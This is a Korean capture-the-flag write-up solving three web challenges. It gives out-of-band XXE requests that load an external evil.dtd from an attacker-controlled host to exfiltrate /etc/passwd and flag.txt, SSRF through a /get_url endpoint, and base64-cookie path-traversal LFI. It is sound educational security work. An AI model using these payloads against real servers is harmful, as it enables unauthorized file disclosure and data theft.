![](https://github.com/wjddnjs33/image/blob/main/0x41414141/team.png?raw=true)

2021년 1월 26일 저녁에 `Ainsetin`님이 씨텝 같이 하자고 하셔서 31일까지 참여를 했었는데 많은 도움이 되지 못 한 거 같아 스스로 반성을 많이 한 대회입니다. 여튼 이번 대회에는 버스를 타서 14등을 했고, 솔브수가 그나마 적은 웹 3 문제의 Write Up을 작성해보겠습니다.<br>

---
## <span style="color:#21C587"></span> (Web) Special Order pt2 [490 pts]

> Special Order pt2 문제는 웹 애플리케이션 취약점을 찾고, OOB XXE를 이용해서 flag를 긁어오는 문제입니다.

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/1.png?raw=true)

문제로 들어오면 login 폼이 보이고, 바로 밑에 회원 가입 링크가 있는 것을 볼 수 있습니다. 그러니 그냥 가입하고, 로그인을 해주면 됩니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/2.png?raw=true)

로그인을 하고 들어오면 `special Order` 블로그가 나오는 것을 볼 수 있고, 위에 보면 `HOME`, `POST`, `POST SETTING`, `CREATE POST`가 있는 것을 볼 수 있습니다. 취약점은 `POST SETTING`에서 터집니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/3.png?raw=true)

`POST SETTING`로 들어오면 폰트 색상과 폰트 사이즈를 정해서 보낼 수 있습니다. 한 번 요청을 보내 헤더를 잡아보겠습니다.<br>

```
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 33
Content-Type: application/json
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

{"color" : "red", "size": "20px"}


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 11:50:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7
Connection: close
Vary: Cookie

DONE :D
```
요청 헤더를 보면 색상과 사이즈를 json으로 보내는 것을 볼 수 있습니다.<br>

```
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 33
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

{"color" : "red", "size": "20px"}


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 11:52:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 70
Connection: close
Vary: Cookie

Start tag expected, '<' not found, line 1, column 1 (<string>, line 1)
```
여기서 Content-Type을 `application/xml`로 바꿔서 보내주면 XML Parsing 에러가 나는 것을 볼 수 있습니다. 이 말은 XML이 작동 중이며 XXE 공격이 가능하다는 소리입니다. 일단 색상과 사이즈의 크기는 응답에 포함되지 않기 때문에 일반적인 XXE 기법을 이용할 순 없습니다. 그래서 `Out-of-band XXE` 기법을 이용하기로 했고, 해당 기법을 쓸려면 일단 DTD를 로드 할 수 있는 지 확인해야합니다.<br>

```
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 175
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pocas [<!ENTITY xxe SYSTEM "http://141.164.52.207/test">]>
<pocas>
    <color>&xxe;</color>
    <size>40px</size>
</root>


// Aapache Log
207.180.200.166 - - [31/Jan/2021:12:14:10 +0000] "GET /test HTTP/1.0" 404 456 "-" "-"
```
확인을 해보니 잘 되는 것을 볼 수 있습니다.<br>

```
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 170
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % xxe SYSTEM "http://141.164.52.207/evil.dtd">
%xxe;
]>


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 12:04:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1343
Connection: close
Vary: Cookie

Invalid URI: http://141.164.52.207/root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
(생략)
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
uwsgi:x:100:101:uwsgi:/dev/null:/sbin/nologin
, line 2, column 77 (evil.dtd, line 2)
```
처음 해보는 기법이라 해외 [블로그](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)를 보며 공부를 하고, 진행했는데 좀 신기했습니다. 여튼 oob xxe를 이용해서 `/etc/passwd`를 긁어오니 잘 긁어오는 것을 볼 수 있습니다. 이제 FLAG가 들어있는 파일만 읽으면 되는데 파일을 모르니 한 번 찾아보겠습니다.<br>

```
// Request
POST /customize HTTP/1.1
Host: 207.180.200.166:5000
Content-Length: 168
Content-Type: application/xml
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % xxe SYSTEM "http://141.164.52.207/evil.dtd">
%xxe;
]>


// Response
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 12:17:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Connection: close
Vary: Cookie

Invalid URI: http://141.164.52.207/flag{i7_1s_n0t_s0_bl1nd3721}
, line 2, column 77 (evil.dtd, line 2)
```
그래서 `flag`, `flag.php`, `flag.txt`를 하나 하나 다 확인 해보니 `flag.txt`가 존재했고, FLAG가 읽히는 것을 볼 수 있었습니다.<br>

```
flag{i7_1s_n0t_s0_bl1nd3721}
```

---
## <span style="color:#21C587"></span> (Web) firstapp [496 pts]

> firstapp 문제는 SSRF 취약점을 이용해서 내부 서버에 있는 파일을 릭하는 문제입니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/1.png?raw=true)

일단 문제로 들어오면 login이 되지 않았다고 뜨는 것을 볼 수 있습니다. 여기서 `/login`이 존재할 거 같다는 생각을 할 수 있고, `/login`으로 가서 아무 아이디/비밀번호로 로그인을 하면 로그인이 됩니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/2.png?raw=true)

```
/profile?id=<name>
```
로그인을 하고 들어오면 위와 같이 3개의 프로필이 있는 것을 볼 수 있습니다. 프로필은 위와 같이 `/profile`에서 `id` 파라미터로 참조하게 됩니다.

```
/profile?id=flag
```
그래서 `id`의 값으로 flag를 주니 `flag.png` 파일이 하나 나오는데 처음에는 이 사진을 HxD로 열어서 확인하면 FLAG가 있을 줄 알았는데 존재하지 않았습니다. 그래서 일단 여기까지 하고 답이 없어서 Dirb를 이용해서 디렉터리 브루트 포싱을 진행했습니다.<br>

```
root@py:~# dirb http://45.134.3.200:3000/ ~/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Jan 31 08:17:05 2021
URL_BASE: http://45.134.3.200:3000/
WORDLIST_FILES: /root/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://45.134.3.200:3000/ ----
+ http://45.134.3.200:3000/css (CODE:301|SIZE:173)
+ http://45.134.3.200:3000/get_file (CODE:200|SIZE:18)
+ http://45.134.3.200:3000/images (CODE:301|SIZE:179)
+ http://45.134.3.200:3000/login (CODE:200|SIZE:5661)
+ http://45.134.3.200:3000/Login (CODE:200|SIZE:5661)
+ http://45.134.3.200:3000/logout (CODE:302|SIZE:28)
+ http://45.134.3.200:3000/profile (CODE:200|SIZE:24)

-----------------
END_TIME: Sun Jan 31 08:33:29 2021
DOWNLOADED: 4612 - FOUND: 7
root@py:~#
```
dirb 툴을 돌려보니 `/get_file`이 존재하는 것을 알 수 있었고, 혹시나 `/get_url`도 있나 해보니 `/get_url`도 있었습니다. 이로서 우리는 2개의 벡터를 더 찾았습니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/3.png?raw=true)

제일 먼저 `/get_file`에서 시도해보았습니다. 일단 파라미터를 알지 못 하지만 file이라는 파라미타를 사용하고 있을 거 같다는 생각을 할 수 있습니다. 그래서 file 파라미터로 flag, flag.txt, flag.py, flag.php 등 등을 읽어 보려 했지만 어떤 값이 들어와도 `SRSLY ???`라는 문자열만 출력이 되었습니다.<br>

하지만 아까 게싱을 해서 `/get_url`이 존재한다는 것을 알아냈습니다. 그래서 SSRF를 이용해서 FLAG가 들어있는 파일을 긁어 오기로 했습니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/4.png?raw=true)

`/get_url`에서 일단 url이라는 파라미터로 SSRF를 시도해보니 `not logged in`이 뜨는 것을 볼 수 있습니다. 분명 로그인을 했는 데, `not logged in`이 뜨는 이유는 내부 서버로 잘 접근을 했다는 것 입니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/5.png?raw=true)

그래서 SSRF를 이용해서 flag.* 파일을 모두 읽어 보니 flag.txt 파일이 존재하는 것을 알 수 있었고, 해당 파일 내용으로 FLAG가 있는 것을 볼 수 있습니다.<br>

```
flag{h0p3_y0u_l1ked_my_@pp5613}
```

---
## <span style="color:#21C587"></span> (Web) waffed [496 pts]

> waffed 문제는 Cookie 변조와 LFI 취약점을 이용해서 flag를 가져오는 문제입니다.

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/1.png?raw=true)

문제로 들어오면 `waffed` 사이트가 뜨는 것을 볼 수 있습니다. 해당 사이트는 각 코인마다 퍼센트지를 보여지는 사이트입니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/2.png?raw=true)

`LEARN MORE` 버튼을 눌러보면 현재 선택한 코인의 퍼센트지를 그래프를 보여주고 있는 것을 볼 수 있고, 현재 코인 이름은 `price_feed` 쿠키에 저장이 되어 있습니다. 그리고 다른 코인의 그래프를 볼 수 있게 설정하는 기능도 있습니다. 그럼 한 번 다른 코인으로 바꾸는 요청을 잡고, 헤더를 확인해보겠습니다.<br>

```
// Request
GET /changeFeed/DAI HTTP/1.1
Host: 207.180.200.166:9090
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw
Connection: close


// Response
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 31 Jan 2021 13:19:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 219
Location: http://207.180.200.166:9090/trade
Connection: close
Set-Cookie: price_feed=REFJ; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/trade">/trade</a>.  If not click the link.
```
헤더를 보면 요청을 하면 `DAI`라는 코인으로 바꾸고, 바로 그래프가 있는 곳으로 리다이렉션 시켜주는 것을 볼 수 있습니다. 여기서 중요한 부분은 응답에 `Set-Cookie` 헤더를 보면 `price_feed`의 값으로 `REFJ`가 들어있는 것을 볼 수 있습니다. `REFJ`는 우리가 바꾼 코인의 이름(DAI)이 b64로 인코딩되어 들어간 것 입니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true)

즉, 서버에서는 b64로 해당 쿠키 값을 디코딩해서 사용한다는 것 입니다. 그래서 일단 SQL Injection을 시도해보기 위해서 페이로드를 b64 인코딩을 해줘서 보내주니 `WOOPS`만 뜨고 아무 일도 일어나지 않았습니다.<br>

하지만 여기서 `price_feed` 값으로 코인 이름을 바꿔서 코인에 대한 파일을 조회하는 거라면?이라고 생각을 했습니다. 그 이유는 코인마다 그래프도 다 다르기 때문에 모든 데이터를 각 코인의 파일로 관리하고 있을 거라는 생각이 들었습니다. 그래서 바로 LFI를 진행했고, 일단 `/etc/passwd`를 긁어오기를 시도했습니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true)

그래서 `/etc/passwd`를 b64로 인코딩해서 쿠키 값으로 설정하고, 새로 고침을 해주니 SQL Injection과 마찬가지로 `WOOPS`라고 뜨는 것을 볼 수 있습니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/4.png?raw=true)

하지만 현재 경로에서 해당 파일이 없어 `WOOPS`가 출력되는 걸 수도 있기 때문에 상위로 한 번 한 번 올라가며 모두 시도 해보았는데, 총 4번 올라가서 `../../../../etc/passwd`를 읽어보니 `WOOPS`가 뜨지 않고, 그래프가 있는 창으로 리다이렉션이 되었습니다. 그런데 이상한 점은 그래프는 있는데 그래프에 데이터가 존재하지 않았습니다.<br>

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/5.png?raw=true)

그래서 그래프의 소스 코드를 확인해보니 그래프를 만드는 JS 코드가 있었고, 그래프의 data 값으로 `/etc/passwd`의 값이 들어가 있는 것을 볼 수 있었습니다. 예상대로 각 코인의 데이터를 파일로 관리하고 있었습니다.

![](https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/6.png?raw=true)

앞에 모든 문제도 FLAG는 `flag.txt`에 있었기 때문에 이번 문제도 상위로 4번 올라가 `../../../../flag.txt`를 읽어주니 그래프의 data에 FLAG가 있는 것을 볼 수 있었습니다.<br>

```
flag{w@fs_r3@lly_d0_Suck8245}
```

---
